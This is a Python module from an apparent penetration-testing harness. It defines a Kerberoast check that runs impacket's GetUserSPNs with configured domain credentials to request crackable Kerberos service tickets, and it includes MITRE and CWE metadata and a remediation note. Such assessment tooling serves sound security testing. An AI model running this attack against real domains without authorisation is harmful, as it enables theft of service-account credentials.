"""Kerberoast via impacket-GetUserSPNs. Fix = AD hardening (NOT SD-WAN)."""
META = {
    "id": "kerberoast",
    "name": "Kerberoast",
    "category": "AD Exploitation",
    "test_type": "pentest",
    "added": True,  # opt-in, not in the original baseline set
    "control": "AD hardening (NOT SD-WAN)",
    "fix": "Server",
    "mitre": ['T1558.003'],
    "cwe": ['CWE-522'],
    "tactic": 'Credential Access',
    "requires": [],                 # resolved at runtime across impacket flavours
    "requires_py": ["impacket"],    # the real dependency (the CLI name varies)
    "ports": [("tcp", 88), ("tcp", 389)],
    "success_regex": r"\$krb5tgs\$|ServicePrincipalName|MSSQL/",
    "blocked_regex": r"timed out|Connection refused|unreachable|Errno",
}

def run(target, ctx):
    # Kerberoast (GetUserSPNs -request) needs valid domain creds. With no password
    # GetUserSPNs.py calls getpass() on a closed stdin -> EOFError -> NO-RESULT.
    # Skip cleanly instead (same guard as ssh_brute).
    if not (ctx.creds.get("dc_pass") or "").strip():
        return ("# kerberoast vs {t}\n\n[SKIP] no domain password configured "
                "(set HARNESS_DC_PASS / credentials.env) — Kerberoast needs valid "
                "creds to request TGS tickets.".format(t=target))
    from modules import _impacket
    tool = _impacket.resolve("GetUserSPNs")
    if not tool:
        return ("# kerberoast vs {t}\n\n[SKIP] impacket not installed — GetUserSPNs "
                "unavailable (pip install impacket / apt python3-impacket).".format(t=target))
    return ctx.run_cmd(
        tool + " {domain}/{dc_user}:{dc_pass} -dc-ip {target} -request", target)
